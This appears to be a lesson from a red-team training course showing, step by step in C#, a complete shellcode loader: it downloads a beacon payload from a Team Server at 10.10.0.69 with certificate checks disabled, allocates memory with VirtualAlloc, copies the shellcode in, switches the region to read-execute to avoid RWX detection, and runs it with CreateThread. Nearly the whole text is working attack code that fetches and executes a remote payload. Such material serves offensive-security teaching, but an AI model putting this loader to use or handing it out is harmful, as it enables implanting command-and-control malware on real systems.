The CreateThread API can be used to create a new thread within the calling process, so we'll be injecting the shellcode into the injector itself.  This is amongst the easiest and most basic type of injection.

1.  Download the shellcode from the Team Server using the **HttpClient** class.  This is disposable, so wrap it in a using statement or call the `Dispose()` method.  We also have to use the **ServerCertificateCustomValidationCallback** to ignore the self-signed SSL error.

```csharp
static async Task Main(string[] args)
{
    byte[] shellcode;

    using (var handler = new HttpClientHandler())
    {
        // ignore ssl, because self-signed
        handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

        using (var client = new HttpClient(handler))
        {
            // Download the shellcode
            shellcode = await client.GetByteArrayAsync("https://10.10.0.69/beacon.bin");
        }
    }
}
```

  

2.  Use **VirtualAlloc** to allocate a new region of memory within this process.  The region has to be large enough to accommodate the shellcode, so we can just use the shellcode's length as a parameter.  The API will typically round up, which is fine.  We also allocate the region with RW permission so we can avoid RWX.

```csharp
// Allocate a region of memory in this process as RW
var baseAddress = Win32.VirtualAlloc(
    IntPtr.Zero,
    (uint)shellcode.Length,
    Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
    Win32.MemoryProtection.ReadWrite);
```

  

3.  Now we can copy the shellcode into this region.  Because it's our own process, we can use **Marshal.Copy** instead of the WriteProcessMemory API (saves a bit of time).

```csharp
// Copy the shellcode into the memory region
Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
```

  

4. Before we can execute the shellcode, we have to flip the memory protection of this region from RW to RX.  **VirtualProtect** takes in the new memory protection and pops out whatever the current protection is.  This is useful to have if you were to flip it back again, but since we're not, just dispose of it with `_`.

```csharp
// Change memory region to RX
Win32.VirtualProtect(
    baseAddress,
    (uint)shellcode.Length,
    Win32.MemoryProtection.ExecuteRead,
    out _);
```

  

5.  Now we can call **CreateThread** to execute this shellcode.

```csharp
// Execute shellcode
var hThread = Win32.CreateThread(
    IntPtr.Zero,
    0,
    baseAddress,
    IntPtr.Zero,
    0,
    out _);
```

  

6.  CreateThread is not a blocking call, so to prevent the process from exiting we can wait on this thread.  **WaitForSingleObject** will block for as long as the thread is running.

```csharp
// Wait infinitely on this thread to stop the process exiting
Win32.WaitForSingleObject(hThread, 0xFFFFFFFF);
```

  
You should now have a beacon running inside the injector.


![](https://rto2-assets.s3.eu-west-2.amazonaws.com/process-injection/createthread/beacon.png)